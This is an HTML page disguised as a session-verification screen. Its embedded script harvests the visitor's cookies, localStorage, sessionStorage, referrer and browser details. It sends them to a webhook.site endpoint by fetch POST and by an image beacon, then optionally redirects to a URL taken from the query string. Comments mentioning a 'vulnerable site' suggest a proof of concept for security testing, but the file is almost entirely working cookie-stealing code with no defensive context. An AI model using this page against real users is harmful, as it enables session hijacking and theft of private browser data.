<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<h2>Verifying Session...</h2>
<script>
// Get webhook from URL
const params = new URLSearchParams(window.location.search);
const webhook = params.get('webhook') || 'b1647e17-560f-4643-a2d6-14043b4a0eda';

// ⚠️ IMPORTANT: DO NOT inject fake cookies!
// Capture ONLY what's actually in the browser

const allData = {
    // This captures REAL cookies from the browser (or empty if none)
    cookies: document.cookie || "No cookies found - please login to vulnerable site first",
    cookieCount: document.cookie ? document.cookie.split(';').length : 0,
    hasCookies: document.cookie ? document.cookie.length > 0 : false,
    localStorage: JSON.stringify(localStorage) || "{}",
    sessionStorage: JSON.stringify(sessionStorage) || "{}",
    url: window.location.href,
    referrer: document.referrer || "Direct",
    timestamp: Date.now(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    // Show if this is the first visit
    isFirstVisit: !document.cookie
};

// Send to webhook
fetch(`https://webhook.site/${webhook}`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(allData)
}).catch(() => {});

// Send via image
new Image().src = `https://webhook.site/${webhook}?cookies=${encodeURIComponent(document.cookie || 'NO_COOKIES')}`;

// Show status
document.body.innerHTML += `<p>🔍 Cookies found: ${document.cookie ? document.cookie.split(';').length : 0}</p>`;
document.body.innerHTML += `<p>🍪 ${document.cookie || '⚠️ No cookies found. Please login to the vulnerable site first.'}</p>`;

// Redirect if specified
const redirect = params.get('redirect');
if (redirect) {
    setTimeout(() => window.location.href = redirect, 3000);
}
</script>
</body>
</html>
